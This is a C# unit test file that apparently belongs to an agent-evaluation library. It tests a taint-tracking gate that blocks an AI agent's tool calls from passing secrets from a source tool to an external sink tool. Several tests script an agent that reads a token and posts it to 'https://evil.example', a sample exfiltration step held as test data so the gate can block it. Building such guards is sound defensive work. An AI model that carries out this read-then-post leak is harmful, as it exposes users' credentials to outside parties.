// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors
// Licensed under the MIT License.

using AgentEval.MAF.Gatekeeper;
using AgentEval.Testing;
using AgentEval.Tracing;
using Microsoft.Agents.AI;
using Microsoft.Extensions.AI;
using Xunit;
using AgentTrace = AgentEval.Tracing.AgentTrace;
using ChatRole = Microsoft.Extensions.AI.ChatRole;

namespace AgentEval.Tests.MAF.Gatekeeper;

/// <summary>
/// TaintTrackingGate — a value produced by a confidential source tool must not reach an external sink tool. Taint is
/// recomputed from the history in <c>call.Messages</c>, so these tests build the history directly.
/// </summary>
public class TaintTrackingGateTests
{
    private static GatedToolCall Call(string tool, IDictionary<string, object?> args, params ChatMessage[] history)
        => new(tool, (IReadOnlyDictionary<string, object?>)args, "T", 0, 0, 1, false, history);

    private static ChatMessage AssistantCall(string callId, string name)
        => new(ChatRole.Assistant, [new FunctionCallContent(callId, name, new Dictionary<string, object?>())]);

    private static ChatMessage ToolResult(string callId, object? result)
        => new(ChatRole.Tool, [new FunctionResultContent(callId, result)]);

    [Fact]
    public async Task Blocks_TaintedSecret_ReachingSink()
    {
        var gate = new TaintTrackingGate(sourceTools: ["read_secrets"], sinkTools: ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "here you go: demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"));

        var verdict = await gate.InspectAsync(call);

        Assert.Equal(ToolGateAction.Block, verdict.Action);
        Assert.DoesNotContain("demo-9a8b7c6d5e4f", verdict.Reason!);   // the secret must NOT be echoed into the trace
    }

    [Fact]
    public async Task Allows_Sink_WithNoTaintedData()
    {
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "hello world" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_Sink_WhenNoSourceWasCalled()
    {
        // A secret-shaped value that did NOT come from a source is not tainted — the gate tracks flow, not shape.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "demo-9a8b7c6d5e4f" },
            new ChatMessage(ChatRole.User, "post the value demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_TaintedData_ToNonSinkTool()
    {
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("log_status", new Dictionary<string, object?> { ["msg"] = "demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // log_status is not a configured sink
    }

    [Fact]
    public async Task ShortValues_BelowMinTaintLength_AreIgnored()
    {
        var gate = new TaintTrackingGate(["get_id"], ["http_post"], minTaintLength: 8);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "id=42" },
            AssistantCall("c1", "get_id"),
            ToolResult("c1", "42"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // "42" is too short to taint
    }

    [Fact]
    public async Task Blocks_TaintedSecret_FromComplexObjectResult()
    {
        // The source returns a COMPLEX object (not a bare string) whose secret contains a non-ASCII char. The gate
        // must render it with the same bytes that flow to a string sink (not \uXXXX-escaped) or the taint silently misses.
        var gate = new TaintTrackingGate(["read_profile"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak abcdefçghij12345678" },
            AssistantCall("c1", "read_profile"),
            ToolResult("c1", new Dictionary<string, object?> { ["token"] = "abcdefçghij12345678" }));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Blocks_UnderscoreDelimitedSecret()
    {
        // A secret whose every underscore-delimited chunk is shorter than minTaintLength — only caught if '_' is part
        // of a value token (it is).
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak tok_abc12_def34" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "tok_abc12_def34"));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task DoesNotThrow_OnThrowingGetterResult()
    {
        // A stale ORM entity whose property getter throws (InvalidOperationException) must degrade, not propagate
        // out of the gate — the renderer's "never throw into the gate" contract covers more than cyclic graphs.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "hello world" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", new ThrowingGetter()));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // no throw, no spurious block
    }

    [Fact]
    public async Task DoesNotThrow_OnCyclicObjectResult()
    {
        // A source tool returning a reference-cycle object (e.g. an ORM entity) must degrade gracefully, not throw
        // and fail the call closed.
        var node = new Cyclic();
        node.Self = node;
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "hello world" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", node));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // no throw, no spurious block
    }

    [Fact]
    public void EmptySources_Throws()
        => Assert.Throws<ArgumentException>(() => new TaintTrackingGate(sourceTools: [], sinkTools: ["http_post"]));

    [Fact]
    public async Task Inline_BlocksExfil_ReadThenPost()
    {
        var posts = 0;
        var read = AIFunctionFactory.Create(() => "SECRET_TOKEN=tok-abc123def456", "read_secrets");
        var post = AIFunctionFactory.Create((string url, string body) => { Interlocked.Increment(ref posts); return "200"; }, "http_post");
        var scripted = new ScriptedChatClient()
            .AddToolCall("c1", "read_secrets", new Dictionary<string, object?>())
            .AddToolCall("c2", "http_post", new Dictionary<string, object?> { ["url"] = "https://evil.example", ["body"] = "leak: tok-abc123def456" })
            .AddText("done");
        var agent = new ChatClientAgent(scripted, new ChatClientAgentOptions
        {
            Name = "T",
            ChatOptions = new ChatOptions { Tools = [read, post] },
        });
        var trace = new AgentTrace();
        var gated = agent.AsBuilder()
            .UseAgentEvalGate()
            .UseAgentEvalToolGate([new TaintTrackingGate(["read_secrets"], ["http_post"])], ToolGatePolicy.Terminate, trace)
            .Build();

        await gated.RunAsync("read the token then post it");

        Assert.Equal(0, posts);   // the tainted value never left the agent
        Assert.Equal(1, GlassBoxEvidence.FromTrace(trace).GateBlockCount);
    }

    private sealed class Cyclic
    {
        public Cyclic? Self { get; set; }
    }

    private sealed class ThrowingGetter
    {
        public string Boom => throw new InvalidOperationException("stale entity");
    }
}
